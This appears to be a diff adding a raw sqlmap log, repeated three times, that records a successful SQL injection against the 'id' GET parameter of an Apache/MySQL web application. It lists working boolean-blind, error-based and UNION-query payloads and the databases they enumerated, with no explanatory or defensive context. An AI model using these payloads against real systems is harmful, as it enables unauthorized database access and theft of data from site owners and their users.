@@ -1,0 +1,63 @@
+sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=107' AND 3650=3650 AND 'tHgV'='tHgV
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=107' AND (SELECT 5161 FROM(SELECT COUNT(*),CONCAT(0x71786b7a71,(SELECT (ELT(5161=5161,1))),0x7170707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'IBHz'='IBHz
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=-3803' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71786b7a71,0x75584a454279587a47726a456b546d74635142454461566e43736d4e706c5743786f7a5375615967,0x7170707071),NULL,NULL-- HFCO
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] DBL02626
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=107' AND 3650=3650 AND 'tHgV'='tHgV
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=107' AND (SELECT 5161 FROM(SELECT COUNT(*),CONCAT(0x71786b7a71,(SELECT (ELT(5161=5161,1))),0x7170707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'IBHz'='IBHz
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=-3803' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71786b7a71,0x75584a454279587a47726a456b546d74635142454461566e43736d4e706c5743786f7a5375615967,0x7170707071),NULL,NULL-- HFCO
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] DBL02626
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=107' AND 3650=3650 AND 'tHgV'='tHgV
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=107' AND (SELECT 5161 FROM(SELECT COUNT(*),CONCAT(0x71786b7a71,(SELECT (ELT(5161=5161,1))),0x7170707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'IBHz'='IBHz
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=-3803' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71786b7a71,0x75584a454279587a47726a456b546d74635142454461566e43736d4e706c5743786f7a5375615967,0x7170707071),NULL,NULL-- HFCO
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] DBL02626
+[*] information_schema
+
